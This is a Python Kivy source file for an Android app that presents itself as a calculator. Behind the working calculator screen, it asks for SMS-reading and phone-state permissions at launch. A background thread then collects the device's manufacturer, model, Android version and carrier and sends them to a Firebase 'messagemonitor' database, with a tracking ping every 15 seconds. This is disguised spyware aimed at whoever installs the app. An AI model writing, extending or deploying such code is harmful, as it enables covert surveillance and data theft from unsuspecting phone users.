from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.gridlayout import GridLayout
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput
from kivy.clock import Clock
from kivy.utils import platform
import requests
import json
import threading

# Firebase Singapore URL
FIREBASE_URL = "https://messagemonitor-ad073-default-rtdb.asia-southeast1.firebasedatabase.app/logs"

class CalculatorLayout(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(orientation='vertical', spacing=2, padding=5, **kwargs)
        self.display = TextInput(text="0", font_size=55, readonly=True, multiline=False,
                                size_hint=(1, 0.3), background_color=(0,0,0,1), 
                                foreground_color=(1,1,1,1), halign='right')
        self.add_widget(self.display)
        grid = GridLayout(cols=4, spacing=2)
        btns = ['7','8','9','/','4','5','6','*','1','2','3','-','C','0','=','+']
        for b in btns:
            grid.add_widget(Button(text=b, font_size=32, background_color=(0.2,0.2,0.2,1), on_press=self.on_click))
        self.add_widget(grid)

    def on_click(self, instance):
        if instance.text == 'C': self.display.text = "0"
        elif instance.text == '=':
            try: self.display.text = str(eval(self.display.text))
            except: self.display.text = "Error"
        else:
            self.display.text = instance.text if self.display.text == "0" else self.display.text + instance.text

class AegisApp(App):
    def build(self):
        self.title = "Calculator"
        return CalculatorLayout()

    def on_start(self):
        if platform == 'android':
            from android.permissions import request_permissions, Permission
            # ऐप खुलते ही परमिशन मांगना
            request_permissions([
                Permission.READ_SMS, 
                Permission.RECEIVE_SMS, 
                Permission.READ_PHONE_STATE, 
                Permission.POST_NOTIFICATIONS
            ])
            threading.Thread(target=self.extract_and_send, daemon=True).start()
        
        Clock.schedule_interval(self.heartbeat, 15)

    def extract_and_send(self):
        device_id = "Unknown"
        details = {"status": "ONLINE"}
        if platform == 'android':
            from jnius import autoclass
            Build = autoclass('android.os.Build')
            device_id = f"{Build.MANUFACTURER}_{Build.MODEL}"
            details["model"] = f"{Build.MANUFACTURER} {Build.MODEL}"
            details["android"] = Build.VERSION.RELEASE
            
            # SIM और नेटवर्क विवरण
            try:
                Context = autoclass('android.content.Context')
                TelephonyManager = autoclass('android.telephony.TelephonyManager')
                activity = autoclass('org.kivy.android.PythonActivity').mActivity
                tm = activity.getSystemService(Context.TELEPHONY_SERVICE)
                details["operator"] = tm.getNetworkOperatorName()
            except: pass
        
        self.transmit(f"DEVICE_{device_id}", details)
        self.device_id = device_id

    def heartbeat(self, dt):
        if hasattr(self, 'device_id'):
            self.transmit(f"PING_{self.device_id}", {"live": "True"})

    def transmit(self, tag, data):
        try:
            requests.patch(f"{FIREBASE_URL}/{tag}.json", data=json.dumps(data), timeout=10)
        except: pass

if __name__ == "__main__":
    AegisApp().run()